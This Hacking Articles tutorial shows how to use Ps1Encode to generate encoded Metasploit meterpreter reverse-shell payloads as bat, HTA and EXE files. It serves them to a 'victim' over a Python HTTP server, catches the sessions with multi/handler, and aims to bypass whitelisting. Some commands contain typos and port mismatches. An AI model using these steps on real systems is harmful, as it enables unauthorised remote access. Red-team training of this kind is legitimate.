<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/collection-of-hacking-tools/" rel="category tag">Hacking Tools</a>, <a href="https://www.hackingarticles.in/category/red-teaming/" rel="category tag">Red Teaming</a></span>            </div>
            <h1 class="post-title entry-title">Generate Metasploit Payload with Ps1encode</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/generate-metasploit-payload-with-ps1encode/" rel="bookmark"><time class="entry-date published" datetime="2018-08-15T17:34:25+00:00">August 15, 2018</time><time class="updated" datetime="2025-05-30T07:19:15+00:00">May 30, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p class="ai-optimize-6 ai-optimize-introduction"><span style="color: #000000;">In this article, we will learn the Ps1Encode tool and how to use it by generating malware in different file formats such as HTA, EXE, etc.</span></p>
<h3 class="ai-optimize-7"><span style="color: #800000;">Introduction</span></h3>
<p class="ai-optimize-8"><span style="color: #000000;">The working code of Ps1Encode is developed by Piotr Marszalik</span><span style="color: #000000;">, Dev Kennedy with few others. Ps1Encode is used to generate a malicious payload in order to generate a meterpreter session. While generating the payload, it will encode it too. It is a different way to bypass Whitelisting and security on the target system. It’s developed in ruby and allows us to create a series of payloads which are based on Metasploit but can be prepared in any format we desire. The final aim is to get a PowerShell running and execute our payload through it.</span></p>
<h3 class="ai-optimize-52"><span style="color: #800000;">Supported Payload Formats in Ps1Encode</span></h3>
<p class="ai-optimize-9"><span style="color: #000000;">There are various formats for our malware that are supported by Ps1Encode are the following :</span></p>
<ul>
<li class="ai-optimize-10"><span style="color: #000000;">raw (encoded payload only – no powershell run options)</span></li>
<li class="ai-optimize-11"><span style="color: #000000;">cmd (for use with bat files)</span></li>
<li class="ai-optimize-12"><span style="color: #000000;">vba (for use with macro trojan docs)</span></li>
<li class="ai-optimize-13"><span style="color: #000000;">vbs (for use with vbs scripts)</span></li>
<li class="ai-optimize-14"><span style="color: #000000;">war (tomcat)</span></li>
<li class="ai-optimize-15"><span style="color: #000000;">exe (executable) requires MinGW – x86_64-w64-mingw32-gcc [apt-get install mingw-w64]</span></li>
<li class="ai-optimize-16"><span style="color: #000000;">java (for use with malicious java applets)</span></li>
<li class="ai-optimize-17"><span style="color: #000000;">js (javascript)</span></li>
<li class="ai-optimize-18"><span style="color: #000000;">js-rd32 (javascript called by rundll32.exe)</span></li>
<li class="ai-optimize-19"><span style="color: #000000;">php (for use with php pages)</span></li>
<li class="ai-optimize-20"><span style="color: #000000;">hta (HTML applications)</span></li>
<li class="ai-optimize-21"><span style="color: #000000;">cfm (for use with Adobe ColdFusion)</span></li>
<li class="ai-optimize-22"><span style="color: #000000;">aspx (for use with Microsoft ASP.NET)</span></li>
<li class="ai-optimize-23"><span style="color: #000000;">lnk (windows shortcut – requires a webserver to stage the payload)</span></li>
<li class="ai-optimize-24"><span style="color: #000000;">sct (COM scriptlet – requires a webserver to stage the payload)</span></li>
</ul>
<h3 class="ai-optimize-53"><span style="color: #800000;">Installing and Exploring Ps1Encode</span></h3>
<p class="ai-optimize-25"><span style="color: #000000;">You can download Ps1Encode from <a style="color: #000000;" href="//github.com/CroweCybersecurity/ps1encode">here</a> using git clone command as shown in the image below :</span></p>
<p class="ai-optimize-26"><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-FVGtsOCbtP0/XHjzmjIqtnI/AAAAAAAAdM8/XtyTyfJ4IqwHXMc4dprCHTJFTMiEnstWACLcBGAs/s1600/1.png"/></span></p>
<p class="ai-optimize-27"><span style="color: #000000;">Once it’s downloaded, let’s use the help command to check the syntax that we have to use. Use the following set of commands for that :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd ps1encode/
ls
./ps1encode.rb -h</pre>
<p class="ai-optimize-28"><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-Bt2brjdHSRw/XHjzmmg-III/AAAAAAAAdNA/ymDInApS4LMghM8kK7jG8lnSSSVxfgSiQCLcBGAs/s1600/2.png"/></span></p>
<p class="ai-optimize-29"><span style="color: #000000;">Following are the syntaxes that we can use :</span></p>
<p class="ai-optimize-30"><span style="color: #000000;"><strong>-i :</strong> defines localhost IP</span></p>
<p class="ai-optimize-31"><span style="color: #000000;"><strong>-p :</strong> defines localhost port value</span></p>
<p class="ai-optimize-32"><span style="color: #000000;"><strong>-a :</strong> defines payload value</span></p>
<p class="ai-optimize-33"><span style="color: #000000;"><strong>-t :</strong> defines the output format</span></p>
<h3 class="ai-optimize-54"><span style="color: #800000;">Generating Malicious Payloads in Different Formats</span></h3>
<p class="ai-optimize-34"><span style="color: #000000;">Now, we will generate a malicious raw file using the following command :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">./ps1encode.rb -I 192.168.1.107 -p 8000 -a windows/meterpreter/reverse_https</pre>
<p class="ai-optimize-35"><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-5yPJLreqAh4/XHjzn52j-8I/AAAAAAAAdNI/UutLCB3uJkgSyEx4lA68sYQ_GBVU6wgWwCLcBGAs/s1600/3.png"/></span></p>
<p class="ai-optimize-36"><span style="color: #000000;">Copy the code generated using the above command in the file with the extension.bat. and then share it by using the python server. You can start the server using the following command :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python -m SimpleHTTPServer 80</pre>
<p class="ai-optimize-37"><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-wkjQN_FJKVo/XHjzoVMQ5HI/AAAAAAAAdNM/KHqZPpaLhWQaMMcs5TroLJ1yFvH9dAnsACLcBGAs/s1600/4.1.png"/></span></p>
<p class="ai-optimize-38"><span style="color: #000000;">Simultaneously, start the multi handler to have a session with the following set of commands :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set lhost 192.168.1.107
lport 8000
exploit</pre>
<p class="ai-optimize-39"><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-Sq4Hrcef6-Y/XHjzoSWdiEI/AAAAAAAAdNQ/yFJrgkKJaxQdIkymE6C4bcmPQEsv-jNHgCLcBGAs/s1600/4.png"/></span></p>
<p class="ai-optimize-40"><span style="color: #000000;">Once the file is executed in the victims’ PC, you will have your session as shown in the image above. Now we will generate our malware in the form of HTA file. Use the following command to generate the HTA file :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">./ps1encode.rb -i 192.168.1.107 -p 4444 -a windows/meterpreter/reverese_tcp -t hta</pre>
<p class="ai-optimize-41"><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-8oXhDZ36nwY/XHjzokrUcbI/AAAAAAAAdNU/QEe6wReV09IKyrbJ5w-7W3qB4dU7eO3ZACLcBGAs/s1600/5.png"/></span></p>
<p class="ai-optimize-42"><span style="color: #000000;">Following script will be created due to the above command, send this file to the victim’s PC using python server like before.</span></p>
<p class="ai-optimize-43"><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-9FS1sMeBxxU/XHjzpfA84BI/AAAAAAAAdNc/-mrUR6KUGrkxRuOmvezb-fp4VM9gfno4ACLcBGAs/s1600/6.png"/></span></p>
<p class="ai-optimize-44"><span style="color: #000000;">Simultaneously, start the multi handler to have a session with the following set of commands :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set lhost 192.168.1.107
set lport 8000
exploit</pre>
<p class="ai-optimize-45"><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-kHLX0fjKt50/XHjzo-y4RLI/AAAAAAAAdNY/4OsJV_aJmYQOzhFdqW2g69NyKY43T1L2ACLcBGAs/s1600/8.png"/></span></p>
<p class="ai-optimize-46"><span style="color: #000000;">Once the file is executed in the victims’ PC, you will have your session as shown in the image above. Now we will try and generate an EXE file with the following :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">./ps1encode -i 192.168.1.107 -p 4444 -a windows/meterpreter/reverse_tcp -t exe</pre>
<p class="ai-optimize-47"><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-Eod8Xvobi-A/XHjzpUpjBXI/AAAAAAAAdNg/usr-lyQtmAQvwMLftuGux_0NBynng6JoACLcBGAs/s1600/9.png"/></span></p>
<p class="ai-optimize-48"><span style="color: #000000;">Send this file to the victim’s PC using python server like before a shown in the image above. Simultaneously, start the multi handler to have a session with the following set of commands :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set lhost 192.168.1.107
set lport 8000
exploit</pre>
<p class="ai-optimize-49"><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-4cVLeM3TVCw/XHjznPB_TpI/AAAAAAAAdNE/xUrDAqydF8k1wutBAhZCdOWtMM2LpaozgCLcBGAs/s1600/10.png"/></span></p>
<p class="ai-optimize-50"><span style="color: #000000;">This way, you can use Ps1Encode to generate files in any format. As you can see, it’s pretty simple and convenient along with being user-friendly. Possibilities with Ps1Encode are endless.</span></p>
<p class="ai-optimize-6"><span style="color: #000000;">To gain more knowledge about hacking tools. Click on this</span> <strong><a href="https://www.hackingarticles.in/category/collection-of-hacking-tools/">link.</a></strong></p>
<p class="ai-optimize-51"><span style="color: #000000;"><strong>Author</strong>: Shubham Sharma is a Cybersecurity enthusiast and Researcher in the field of WebApp Penetration testing. Contact</span> <a href="//www.linkedin.com/in/shubham-sharma-626964153/"><strong>here</strong></a></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
